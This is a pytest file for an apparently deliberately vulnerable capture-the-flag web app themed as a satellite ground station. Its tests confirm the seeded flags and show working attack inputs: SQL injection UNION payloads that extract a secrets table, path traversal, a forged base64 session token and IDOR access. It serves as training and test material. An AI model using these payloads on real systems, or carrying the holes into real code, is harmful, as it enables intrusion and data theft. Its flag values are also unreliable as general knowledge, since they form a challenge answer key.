import base64
import os
import tempfile

import pytest

from webapp.config import TestConfig
from webapp.db import init_db
from webapp.seed import seed_db


@pytest.fixture
def app():
    from webapp.app import create_app

    db_fd, db_path = tempfile.mkstemp(suffix=".db")
    app = create_app(TestConfig, db_path=db_path)
    with app.app_context():
        init_db()
        seed_db()
        yield app
    os.close(db_fd)
    os.unlink(db_path)


@pytest.fixture
def operator_client(app):
    client = app.test_client()
    client.post("/login", data={"username": "operator", "password": "operator123"})
    return client


@pytest.fixture
def admin_client(app):
    client = app.test_client()
    client.post("/login", data={"username": "admin", "password": "password"})
    return client


def test_schema_has_admin_notes(app):
    from webapp.db import get_db

    with app.app_context():
        db = get_db()
        cols = {row[1] for row in db.execute("PRAGMA table_info(users)").fetchall()}
        assert "admin_notes" in cols


def test_schema_has_radio_config_notes(app):
    from webapp.db import get_db

    with app.app_context():
        db = get_db()
        cols = {row[1] for row in db.execute("PRAGMA table_info(radio_config)").fetchall()}
        assert "notes" in cols


def test_schema_has_secrets_table(app):
    from webapp.db import get_db

    with app.app_context():
        db = get_db()
        tables = {row[0] for row in db.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()}
        assert "secrets" in tables


def test_seed_admin_notes_flag(app):
    from webapp.db import get_db

    with app.app_context():
        db = get_db()
        admin = db.execute("SELECT admin_notes FROM users WHERE username = 'admin'").fetchone()
        assert admin["admin_notes"] == "PWNSAT{XSS_IN_MISSION_LOGS}"


def test_seed_admin_radio_config_notes_flag(app):
    from webapp.db import get_db

    with app.app_context():
        db = get_db()
        config = db.execute("SELECT notes FROM radio_config WHERE owner = 'admin'").fetchone()
        assert config["notes"] == "PWNSAT{IDOR_ADMIN_CONFIG}"


def test_seed_secrets_flag(app):
    from webapp.db import get_db

    with app.app_context():
        db = get_db()
        secret = db.execute("SELECT * FROM secrets WHERE name = 'satellite_master_key'").fetchone()
        assert secret["value"] == "PWNSAT{TELEMETRY_DB_TAMPERED}"
        assert secret["access_level"] == "classified"


def test_seed_debug_log_flag(app):
    from webapp.db import get_db

    with app.app_context():
        db = get_db()
        log = db.execute("SELECT * FROM logs WHERE level = 'DEBUG'").fetchone()
        assert log is not None
        assert log["message"] == "PWNSAT{LOG_INJECTION_SUCCESS}"
        assert log["source"] == "flag-service"


def test_lfi_flag_file_exists():
    flag_path = os.path.join(os.path.dirname(__file__), "..", "webapp", "lfi_flag.txt")
    assert os.path.exists(flag_path)
    with open(flag_path) as f:
        assert f.read().strip() == "PWNSAT{LFI_TRAVERSAL_SUCCESS}"


def test_radio_flag_file_exists():
    flag_path = os.path.join(os.path.dirname(__file__), "..", "webapp", "radio_flag.txt")
    assert os.path.exists(flag_path)
    with open(flag_path) as f:
        assert f.read().strip() == "PWNSAT{CMDI_IN_RADIO_CONFIG}"


def test_supply_chain_flag_in_requirements():
    req_path = os.path.join(os.path.dirname(__file__), "..", "requirements.txt")
    with open(req_path) as f:
        content = f.read()
    assert "PWNSAT{SUPPLY_CHAIN_COMPROMISED}" in content


def test_gs05_admin_panel_as_admin(admin_client):
    resp = admin_client.get("/api/admin/panel")
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["flag"] == "PWNSAT{SESSION_TOKEN_FORGED}"


def test_gs05_admin_panel_as_operator(operator_client):
    resp = operator_client.get("/api/admin/panel")
    assert resp.status_code == 403


def test_gs05_admin_panel_forged_token(app):
    client = app.test_client()
    forged = base64.b64encode(b"admin:admin:0").decode()
    client.set_cookie("session_token", forged)
    resp = client.get("/api/admin/panel")
    assert resp.status_code == 200
    assert resp.get_json()["flag"] == "PWNSAT{SESSION_TOKEN_FORGED}"


def test_gs02_users_me_as_admin(admin_client):
    resp = admin_client.get("/api/users/me")
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["username"] == "admin"
    assert data["admin_notes"] == "PWNSAT{XSS_IN_MISSION_LOGS}"


def test_gs02_users_me_as_operator(operator_client):
    resp = operator_client.get("/api/users/me")
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["username"] == "operator"
    assert data["admin_notes"] == ""


def test_gs08_radio_status(operator_client):
    resp = operator_client.get("/api/radio/status")
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["bridge_key"] == "PWNSAT{WEB_TO_SPACE_LINK}"


def test_gs12_debug_flags_no_auth(app):
    client = app.test_client()
    resp = client.get("/api/debug/flags")
    assert resp.status_code == 200
    assert resp.get_json()["flag"] == "PWNSAT{API_NO_RATE_LIMIT}"


def test_gs11_logs_page_hides_debug(operator_client):
    resp = operator_client.get("/logs")
    assert resp.status_code == 200
    assert b"PWNSAT{LOG_INJECTION_SUCCESS}" not in resp.data
    assert b"flag-service" not in resp.data


def test_gs11_debug_log_exists_in_db(app):
    from webapp.db import get_db

    with app.app_context():
        db = get_db()
        row = db.execute("SELECT * FROM logs WHERE level = 'DEBUG'").fetchone()
        assert row is not None
        assert row["message"] == "PWNSAT{LOG_INJECTION_SUCCESS}"


def test_gs12_debug_flags_listed_in_endpoints(app):
    client = app.test_client()
    resp = client.get("/api/endpoints")
    rules = [r["rule"] for r in resp.get_json()]
    assert "/api/debug/flags" in rules


@pytest.fixture
def auth_client(app):
    client = app.test_client()
    client.post("/login", data={"username": "operator", "password": "operator123"})
    return client


def test_gs04_lfi_flag_via_traversal(auth_client):
    """GS-04: LFI reads lfi_flag.txt via path traversal."""
    resp = auth_client.get("/api/logs?file=../lfi_flag.txt")
    assert resp.status_code == 200
    assert "PWNSAT{LFI_TRAVERSAL_SUCCESS}" in resp.get_json()["content"]


def test_gs06_idor_flag_via_admin_config(operator_client):
    """GS-06: Operator accesses admin's radio config and finds flag."""
    resp = operator_client.get("/api/config/radio/1")
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["notes"] == "PWNSAT{IDOR_ADMIN_CONFIG}"


def test_gs09_secrets_via_sqli(operator_client):
    """GS-09: SQLi UNION SELECT on secrets table reveals flag."""
    payload = "' UNION SELECT name,value,access_level,1,2,3,4,5,6,7,8,9,10 FROM secrets--"
    resp = operator_client.get(f"/api/telemetry?search={payload}&limit=100")
    assert resp.status_code == 200
    data = resp.get_json()
    found = any("PWNSAT{TELEMETRY_DB_TAMPERED}" in str(row.values()) for row in data)
    assert found, "SQLi UNION on secrets should reveal GS-09 flag"


def test_gs11_debug_log_via_sqli(operator_client):
    """GS-11: SQLi UNION SELECT on logs table reveals hidden DEBUG flag."""
    payload = "' UNION SELECT id,timestamp,level,source,message,6,7,8,9,10,11,12,13 FROM logs WHERE level='DEBUG'--"
    resp = operator_client.get(f"/api/telemetry?search={payload}&limit=100")
    assert resp.status_code == 200
    data = resp.get_json()
    found = any("PWNSAT{LOG_INJECTION_SUCCESS}" in str(row.values()) for row in data)
    assert found, "SQLi UNION on logs should reveal GS-11 DEBUG flag"
